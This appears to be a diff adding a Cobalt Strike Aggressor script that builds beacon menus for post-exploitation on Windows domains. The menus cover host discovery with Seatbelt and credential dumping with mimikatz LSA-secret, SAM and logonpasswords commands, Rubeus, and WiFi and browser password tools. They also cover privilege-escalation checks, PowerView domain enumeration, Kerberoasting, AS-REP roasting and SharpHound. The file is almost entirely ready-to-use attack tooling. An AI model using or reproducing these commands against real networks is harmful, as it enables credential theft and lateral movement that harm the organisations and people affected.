@@ -1,0 +1,288 @@
+popup beacon_bottom
+{
+    menu "Host Discovery"
+    {
+         menu "Seatbelt"
+            {
+                item "Group : user"
+                {
+                    bexecute_assembly($1, script_resource('Tools/Seatbelt.exe'), " -group=user");
+                }
+
+                item "Group : system"
+                {
+                    bexecute_assembly($1, script_resource('Tools/Seatbelt.exe'), " -group=system");
+
+                }
+
+                item "Group : remote"
+                {
+                    bexecute_assembly($1, script_resource('Tools/Seatbelt.exe'), " -group=remote");
+                }
+                item "Group : misc"
+                {
+                    bexecute_assembly($1, script_resource('Tools/Seatbelt.exe'), " -group=misc");
+                }
+            }
+
+        menu "Credentials"
+        {
+            item "Lsa secret"
+            {
+                bmimikatz($1, "token::elevate; lsadump::secrets");
+            }
+           
+            item "logonpassword"
+            {
+                blogonpasswords($1);
+            }
+
+            item "SAM dump"
+            {
+                bmimikatz($1, "token::elevate; lsadump::sam");
+            }
+
+            item "Ticket list"
+            {
+                bexecute_assembly($1, script_resource('Tools/Rubeus.exe'), "triage");
+            }
+
+
+            item "Wifi password"
+            {
+                bexecute_assembly($1, script_resource('Tools/SharpWifiDump.exe'), " ");
+            }
+
+            item "Password in registry (Machine)"
+            {
+                bpowerpick($1, "reg query HKLM /f password /t REG_SZ /s");
+            }
+
+            item "Password in registry (User)"
+            {
+                bpowerpick($1, "reg query HKLM /f password /t REG_SZ /s");
+            }
+
+            item "SharpWeb"
+            {
+                bexecute_assembly($1, script_resource('Tools/SharpWeb.exe'), " all");
+            }
+            
+        }
+
+        menu "Privilege Esclation"
+        {
+            item "SharpUp"
+            {
+                bexecute_assembly($1, script_resource('Tools/SharpUp.exe'), ' audit');
+            }
+
+            item "PrivescCheck"
+            {
+                bpowershell_import($1, script_resource("Tools/PrivescCheck.ps1"));
+                bpowerpick($1, ' Invoke-PrivescCheck');
+                bpowershell_import_clear($1);
+            }
+
+            item "PrivescCheck - Extended"
+            {
+                bpowershell_import($1, script_resource("Tools/PrivescCheck.ps1"));
+                bpowerpick($1, ' Invoke-PrivescCheck -Extended');
+                bpowershell_import_clear($1);
+            }
+
+        }
+        
+    }
+
+    menu "Domain Discovery"
+    {
+        item "Domain information"
+        {
+		    bpowershell_import($1, script_resource("Tools/PowerView.ps1"));
+            bpowerpick($1, ' Get-Domain');
+            bpowershell_import_clear($1);
+        }
+
+        item "Domain Controller"
+        {
+		    bpowershell_import($1, script_resource("Tools/PowerView.ps1"));
+            bpowerpick($1, ' Get-DomainController');
+            bpowershell_import_clear($1);
+        }
+
+        item "Trust information"
+        {
+            bpowershell_import($1, script_resource("Tools/PowerView.ps1"));
+            bpowerpick($1, ' Get-DomainTrust');
+            bpowershell_import_clear($1);
+
+        }
+
+        item "User list"
+        {
+            bpowershell_import($1, script_resource("Tools/PowerView.ps1"));
+            bpowerpick($1, ' Get-DomainUser -Properties DisplayName, MemberOf | fl');
+            bpowershell_import_clear($1);
+        }
+
+        item "Computer list"
+        {
+            bpowershell_import($1, script_resource("Tools/PowerView.ps1"));
+            bpowerpick($1, ' Get-DomainComputer -Properties DnsHostName | sort -Property DnsHostName');
+            bpowershell_import_clear($1);
+        }
+
+
+        item "Group list"
+        {
+            bpowershell_import($1, script_resource("Tools/PowerView.ps1"));
+            bpowerpick($1, ' Get-DomainGroup | where Name -like "*Admins*" | select SamAccountName');
+            bpowershell_import_clear($1);
+        }
+
+        item "GPO list"
+        {
+            bpowershell_import($1, script_resource("Tools/PowerView.ps1"));
+            bpowerpick($1, ' Get-DomainGPO -Properties DisplayName | sort -Property DisplayName');
+            bpowershell_import_clear($1);
+        }
+
+        item "GPO Local Group"
+        {
+            bpowershell_import($1, script_resource("Tools/PowerView.ps1"));
+            bpowerpick($1, ' Get-DomainGPOLocalGroup | select GPODisplayName, GroupName');
+            bpowershell_import_clear($1);
+        }
+
+        item "OU list"
+        {
+            bpowershell_import($1, script_resource("Tools/PowerView.ps1"));
+            bpowerpick($1, ' Get-DomainOU -Properties Name | sort -Property Name');
+            bpowershell_import_clear($1);
+        }
+
+
+        item "MSSQL Instance"
+        {
+            bpowershell_import($1, script_resource("Tools/PowerUpSQL.ps1"));
+            bpowerpick($1, ' Get-SQLInstanceLocal -Verbose');
+            bpowershell_import_clear($1);
+
+        }
+
+        item "Kerberoastable user"
+        {
+            bexecute_assembly($1, script_resource('Tools/Rubeus.exe'), "kerberoast /nowrap");
+        }
+
+        item "Asreprostable user"
+        {
+            bexecute_assembly($1, script_resource('Tools/Rubeus.exe'), "asreproast /nowrap");
+        }
+
+        item "Logged on"
+        {
+            bpowershell_import($1, script_resource("Tools/PowerView.ps1"));
+            bpowerpick($1, ' Get-DomainComputer | Get-NetLoggedon');
+            bpowershell_import_clear($1);
+        }
+
+        item "Net session"
+        {
+            bpowershell_import($1, script_resource("Tools/PowerView.ps1"));
+            bpowerpick($1, ' Get-DomainComputer | Get-NetSession');
+            bpowershell_import_clear($1);
+        }
+
+        item "RDP Session"
+        {
+            bpowershell_import($1, script_resource("Tools/PowerView.ps1"));
+            bpowerpick($1, ' Get-DomainComputer | Get-NetRDPSession');
+            bpowershell_import_clear($1);
+        }
+
+        item "DFS Share"
+        {
+            bpowershell_import($1, script_resource("Tools/PowerView.ps1"));
+            bpowerpick($1, ' Get-DomainDFSShare');
+            bpowershell_import_clear($1);
+
+        }
+
+        item "Net share"
+        {
+            bpowershell_import($1, script_resource("Tools/PowerView.ps1"));
+            bpowerpick($1, ' Get-DomainComputer | Get-NetShare');
+            bpowershell_import_clear($1);
+        }
+
+        item "Share finder"
+        {
+            bpowershell_import($1, script_resource("Tools/PowerView.ps1"));
+            bpowerpick($1, ' Invoke-ShareFinder');
+            bpowershell_import_clear($1);
+        }
+
+        item "Search deleguation (user)"
+        {
+            bpowershell_import($1, script_resource("Tools/PowerView.ps1"));
+            bpowerpick($1, ' Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto');
+            bpowershell_import_clear($1);
+        }
+
+        item "Search deleguation (computer)"
+        {
+            bpowershell_import($1, script_resource("Tools/PowerView.ps1"));
+            bpowerpick($1, ' Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto');
+            bpowershell_import_clear($1);
+        }
+
+        item "DNS Record"
+        {
+            bpowershell_import($1, script_resource("Tools/PowerView.ps1"));
+            bpowerpick($1, ' Get-DomainDNSZone | Get-DomainDNSRecord | select name');
+            bpowershell_import_clear($1);
+        }
+
+        item "Run SharpHound"
+        {
+            bexecute_assembly($1, script_resource('Tools/SharpHound.exe'), "-c All,GPOLocalGroup");
+        }
+
+    }
+
+    menu "Import module"
+    {
+        item "PowerView"
+        {
+            bpowershell_import($1, script_resource("Tools/PowerView.ps1"));
+        }
+
+        item "PowerUpSQL"
+        {
+            bpowershell_import($1, script_resource("Tools/PowerUpSQL.ps1"));
+        }
+
+        item "Powermad"
+        {
+            bpowershell_import($1, script_resource("Tools/Powermad.ps1"));
+        }
+
+        item "PrivescCheck"
+        {
+
+            bpowershell_import($1, script_resource("Tools/PrivescCheck.ps1"));
+        }
+
+        item "Inveigh"
+        {
+            bpowershell_import($1, script_resource("Tools/Inveigh.ps1"));
+        }
+
+        item "Clear"
+        {
+            bpowershell_import_clear($1);
+        }
+    }
+}
